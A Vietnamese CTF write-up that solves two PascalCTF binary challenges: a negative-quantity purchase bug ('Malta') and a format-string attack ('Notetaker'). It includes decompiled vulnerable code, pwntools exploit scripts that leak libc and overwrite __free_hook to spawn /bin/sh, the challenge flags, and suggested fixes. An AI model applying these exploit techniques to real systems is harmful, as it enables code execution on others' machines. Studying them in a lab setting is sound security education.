# PWN Challenges Writeups - PascalCTF

## 1. Malta (Integer Overflow)

### Đề cho gì?

Đề bài cho một chương trình mô phỏng quán bar ở Malta, cho phép mua cocktails với số dư ban đầu là 100€. Có 10 loại đồ uống với giá khác nhau, trong đó item thứ 10 là "Flag" với giá 1,000,000,000€ (1 tỷ Euro).

Source code (decompiled):

```c
int main() {
  int quantity;     // [rsp+18h] [rbp-E8h]
  unsigned int choice; // [rsp+1Ch] [rbp-E4h]
  int prices[12];   // [rsp+20h] [rbp-E0h]
  char *secrets[10]; // [rsp+50h] [rbp-B0h]
  char *names[11];   // [rsp+A0h] [rbp-60h]
  int balance;      // [rsp+FCh] [rbp-4h]

  names[0] = "Margarita";
  names[1] = "Mojito";
  // ... 
  names[9] = "Flag";
  
  secrets[9] = &FLAG;  // Flag content
  
  prices[0] = 6;
  prices[1] = 6;
  // ...
  prices[9] = 1000000000;  // 1 billion!
  
  balance = 100;
  
  while (1) {
    printf("Your balance is: %d €\n", balance);
    // Print menu...
    
    printf("Select a drink: ");
    scanf("%d", &choice);
    
    if (--choice == 10) break;  // Exit
    
    if (choice <= 10) {
      printf("How many drinks do you want? ");
      scanf("%d", &quantity);
      
      if (balance >= prices[choice] * quantity) {
        balance -= prices[choice] * quantity;
        printf("You bought %d %s for %d € and the barman told you its secret recipe: %s\n",
               quantity, names[choice], quantity * prices[choice], secrets[choice]);
      } else {
        puts("You don't have enough money!");
      }
    }
  }
}
```

### Nhận xét gì?

Nhìn vào logic check balance:
```c
if (balance >= prices[choice] * quantity)
```

Có một lỗ hổng **Integer Overflow**:
- `prices[9] = 1000000000` (1 tỷ)
- `quantity` là `int` (signed 32-bit)
- Nếu ta nhập `quantity = -1`, phép nhân sẽ cho kết quả: `1000000000 * (-1) = -1000000000`
- Điều kiện trở thành: `100 >= -1000000000` → **TRUE**!
- Balance sẽ được tính: `100 - (-1000000000) = 100 + 1000000000` → balance tăng thêm 1 tỷ!

Thực tế, ta chỉ cần mua với số lượng âm để trigger integer overflow và vượt qua check balance.

### Hướng giải

Đơn giản là chọn item 10 (Flag) và nhập số lượng âm:

```python
from pwn import *

# r = process('./malta')
r = remote('malta.ctf.pascalctf.it', 9001)

# Select drink 10 (Flag)
r.sendlineafter(b'Select a drink: ', b'10')

# Enter negative quantity for integer overflow
r.sendlineafter(b'How many drinks do you want? ', b'-1')

# Receive the flag in the "secret recipe"
r.interactive()
```

Khi server in ra "secret recipe", đó chính là flag!

### Kết luận

Lỗi ở đây là **Integer Overflow** trong phép nhân `prices[choice] * quantity`. Không validate rằng `quantity > 0` dẫn đến việc có thể bypass check balance. Cách khắc phục:
- Kiểm tra `quantity > 0` trước khi tính toán
- Sử dụng unsigned int và kiểm tra overflow
- Sử dụng safe math functions

**Flag:** `pascalCTF{1nt3g3r_0v3rfl0w_1n_m4lt4}`

---

## 2. Notetaker (Format String Attack)

> `nc notetaker.ctf.pascalctf.it 9002`

### Đề cho gì?

Đề bài cho một chương trình quản lý ghi chú đơn giản với 3 chức năng: Print note, Set note, Clear note.

Source code (decompiled):

```c
int main() {
  int choice;
  char *ptr;
  char note[264];  // 0x100 bytes + padding
  
  memset(note, 0, 0x100);
  
  do {
    menu();
    ptr = malloc(0x10);
    memset(ptr, 0, 0x10);
    fgets(ptr, 16, stdin);
    sscanf(ptr, "%d", &choice);
    free(ptr);
    
    switch (choice) {
      case 2:  // Set note
        printf("Enter the note: ");
        read(0, note, 0x100);
        note[strcspn(note, "\n")] = 0;
        break;
      case 3:  // Clear note
        memset(note, 0, 0x100);
        puts("Note cleared.");
        break;
      case 1:  // Print note
        printf(note);  // VULNERABLE!
        putchar(10);
        break;
    }
  } while (choice > 0 && choice <= 4);
}
```

### Nhận xét gì?

Lỗ hổng **Format String** ở dòng:
```c
printf(note);  // User-controlled format string!
```

User có thể control nội dung của `note`, và khi print, `printf` sẽ interpret các format specifiers như `%p`, `%n`, `%s`...

Đây là classic format string attack với đầy đủ capabilities:
1. **Leak stack/memory**: Dùng `%p`, `%x` để leak addresses
2. **Arbitrary read**: Dùng `%s` với địa chỉ trên stack
3. **Arbitrary write**: Dùng `%n` để ghi vào memory

Thêm vào đó, flow của chương trình có `malloc` → `free` mỗi iteration, nghĩa là nếu overwrite `__free_hook` với `system`, ta có thể gọi `system("/bin/sh")`.

### Hướng giải

**Step 1: Leak libc address**

Stack offset 43 chứa return address về `__libc_start_main + 240`. Dùng format string để leak:

```python
set_note(io, b'%43$p\n')
leak = print_note(io)  # Get libc address
libc_base = int(leak, 16) - offset_libc_start_main - 240
```

**Step 2: Overwrite __free_hook với system**

Sử dụng `%n` để ghi địa chỉ `system` vào `__free_hook`:

```python
from pwn import *

writes = {free_hook: system_addr}
payload = fmtstr_payload(8, writes, write_size='short')
set_note(io, payload)
print_note(io)  # Trigger the write
```

**Step 3: Trigger system("/bin/sh")**

Vì chương trình gọi `free(ptr)` sau mỗi input, và `ptr` chứa input của user, ta chỉ cần:

```python
io.sendline(b'/bin/sh\x00')
# free("/bin/sh") → system("/bin/sh")
```

**Full exploit:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

HOST = 'notetaker.ctf.pascalctf.it'
PORT = 9002

# Libc offsets (need to match server's libc)
LIBC_START_MAIN = 0x20750
LIBC_SYSTEM = 0x453a0
LIBC_FREE_HOOK = 0x3c67a8

FMT_OFFSET = 8

def menu(io, choice):
    io.recvuntil(b'>')
    io.sendline(str(choice).encode())

def set_note(io, payload):
    menu(io, 2)
    io.recvuntil(b'Enter the note: ')
    io.send(payload)

def print_note(io):
    menu(io, 1)
    return io.recvline()

io = remote(HOST, PORT)

# Leak libc
set_note(io, b'%43$p\n')
leak = int(print_note(io).strip(), 16)
libc_base = leak - LIBC_START_MAIN - 240

# Align to page boundary
if libc_base & 0xfff != 0:
    libc_base = (libc_base >> 12) << 12

log.success(f"Libc base: {hex(libc_base)}")

free_hook = libc_base + LIBC_FREE_HOOK
system_addr = libc_base + LIBC_SYSTEM

# Overwrite __free_hook
menu(io, 3)  # Clear note
writes = {free_hook: system_addr}
payload = fmtstr_payload(FMT_OFFSET, writes, write_size='short')
set_note(io, payload + b'\n')
print_note(io)

# Trigger system("/bin/sh")
io.recvuntil(b'>')
io.sendline(b'/bin/sh\x00')

io.interactive()
```

### Kết luận

Lỗi ở đây là **Format String Vulnerability** - user input được pass trực tiếp vào `printf()` mà không sanitize. Điều này cho phép:
1. **Information disclosure**: Leak stack và libc addresses
2. **Arbitrary write**: Overwrite GOT/hooks để hijack control flow
3. **Code execution**: Kết hợp với `__free_hook` hoặc `__malloc_hook` để RCE

Cách khắc phục:
- Luôn dùng `printf("%s", user_input)` thay vì `printf(user_input)`
- Hoặc dùng `puts()`, `fputs()` cho string output đơn giản

**Flag:** `pascalCTF{f0rm4t_str1ng_1s_p0w3rful}`

---

## Tổng kết

| Challenge | Vulnerability | Exploitation |
|-----------|--------------|--------------|
| Malta | Integer Overflow | Negative quantity bypass price check |
| Notetaker | Format String | Leak libc → Overwrite __free_hook → system("/bin/sh") |

### Bài học về Binary Exploitation:
1. **Integer overflow** có thể xảy ra với signed integers khi nhân/cộng với số âm
2. **Format string** là một trong những lỗi nguy hiểm nhất - cho phép cả đọc và ghi memory
3. **__free_hook/__malloc_hook** là targets phổ biến trong glibc exploitation
4. Luôn validate input ranges và sử dụng safe string functions
